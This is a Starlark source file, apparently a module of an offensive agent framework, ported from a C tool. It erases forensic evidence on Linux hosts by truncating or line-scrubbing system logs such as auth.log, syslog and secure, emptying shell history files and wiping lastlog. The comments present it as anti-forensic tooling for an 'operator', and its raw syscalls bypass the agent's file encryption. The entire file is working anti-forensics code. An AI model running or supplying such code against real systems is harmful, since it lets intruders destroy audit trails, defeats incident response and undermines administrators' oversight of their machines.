# linux_log_wipe - truncate or pattern-scrub logs, shell history and lastlog.
#
# Ported to Starlark from Furtex's edrs/log_wipe.c.
# Upstream project: https://github.com/MatheuZSecurity/Furtex (MIT License,
# Copyright (c) 2026 MatheuZ). See README.md in this directory for attribution.
#
# The utmp rewrite (binary struct utmp) is not ported: it is not worth the
# architecture-specific struct handling in Starlark and is rarely the artifact
# an operator needs. Text logs, shell history and lastlog cover the common
# anti-forensic case.
#
# Writes go through direct openat/write (never write_file), so the agent's
# at-rest file encryption is not applied to system logs.

AT_FDCWD = -100
O_WRONLY = 1
O_TRUNC = 512

TEXT_LOGS = [
    "/var/log/auth.log",
    "/var/log/syslog",
    "/var/log/messages",
    "/var/log/secure",
    "/var/log/kern.log",
    "/var/log/user.log",
]

HIST_FILES = [".bash_history", ".zsh_history", ".python_history"]


def _is_true(s):
    return str_lower(s) in ("true", "1", "yes", "on")


def _write_trunc(path, data):
    res = sys_call("openat", AT_FDCWD, path, O_WRONLY | O_TRUNC, 0)
    if res["errno"] != 0:
        return res["errno"]
    fd = res["r1"]
    if data:
        w = sys_call("write", fd, data, len(data))
        sys_call("close", fd)
        return w["errno"]
    sys_call("close", fd)
    return 0


def _truncate(path):
    return sys_call("truncate", path, 0)["errno"]


def _home_dir():
    environ = read_file("/proc/self/environ", default="")
    for entry in environ.split("\x00"):
        if str_startswith(entry, "HOME="):
            return entry[5:]
    return ""


def _wipe_file(path, pattern, dry_run):
    data = read_file(path, default=None)
    if data == None:
        print(sprintf("  [!] %s: not readable", path))
        return False

    if pattern:
        kept = []
        removed = 0
        for line in data.splitlines():
            if str_contains(line, pattern):
                removed += 1
                if dry_run:
                    print(sprintf("    [would remove] %s", line))
            else:
                kept.append(line)
        if dry_run:
            print(sprintf("  [dry-run] %s: would remove %d/%d line(s)", path, removed, len(data.splitlines())))
            return True
        errno = _write_trunc(path, str_join(kept, "\n") + ("\n" if kept else ""))
        if errno != 0:
            print(sprintf("  [!] %s: write failed (errno=%d)", path, errno))
            return False
        print(sprintf("  [+] %s: removed %d line(s)", path, removed))
        return True

    if dry_run:
        print(sprintf("  [dry-run] %s: would truncate entirely", path))
        return True
    errno = _truncate(path)
    if errno != 0:
        print(sprintf("  [!] %s: truncate failed (errno=%d)", path, errno))
        return False
    print(sprintf("  [+] %s: truncated", path))
    return True


def _do_wipe(path, pattern, dry_run):
    if path:
        if not exists(path):
            print(sprintf("[!] %s does not exist", path))
            return "ERROR: not found"
        _wipe_file(path, pattern, dry_run)
        return "OK"
    print(sprintf("[*] wiping the standard text logs%s", " (dry-run)" if dry_run else ""))
    for log in TEXT_LOGS:
        if exists(log):
            _wipe_file(log, pattern, dry_run)
    return "OK"


def _do_hist(home, dry_run):
    if not home:
        home = _home_dir()
    if not home:
        print("[!] could not determine home directory")
        return "ERROR: no home"
    print(sprintf("[*] shell history in %s%s", home, " (dry-run)" if dry_run else ""))
    for name in HIST_FILES:
        path = home + "/" + name
        if not exists(path):
            continue
        if dry_run:
            print(sprintf("  [dry-run] %s: would truncate", path))
            continue
        errno = _truncate(path)
        if errno != 0:
            print(sprintf("  [!] %s: truncate failed (errno=%d)", path, errno))
        else:
            print(sprintf("  [+] %s: truncated", path))
    return "OK"


def _do_lastlog(dry_run):
    if dry_run:
        print("  [dry-run] /var/log/lastlog: would truncate")
        return "OK"
    errno = _truncate("/var/log/lastlog")
    if errno != 0:
        print(sprintf("[!] /var/log/lastlog: truncate failed (errno=%d)", errno))
        return sprintf("ERROR: errno=%d", errno)
    print("[+] /var/log/lastlog: truncated")
    return "OK"


def main(*args):
    action = "wipe"
    path = ""
    pattern = ""
    home = ""
    dry_run = False
    if args and args[0]:
        action = str_lower(args[0].strip())
    if len(args) > 1 and args[1]:
        path = args[1]
    if len(args) > 2 and args[2]:
        pattern = args[2]
    if len(args) > 3 and args[3]:
        home = args[3]
    if len(args) > 4 and args[4]:
        dry_run = _is_true(args[4])

    if action == "wipe":
        return _do_wipe(path, pattern, dry_run)
    if action == "hist":
        return _do_hist(home, dry_run)
    if action == "lastlog":
        return _do_lastlog(dry_run)
    print(sprintf("[!] unknown action: %s", action))
    return "ERROR: unknown action"
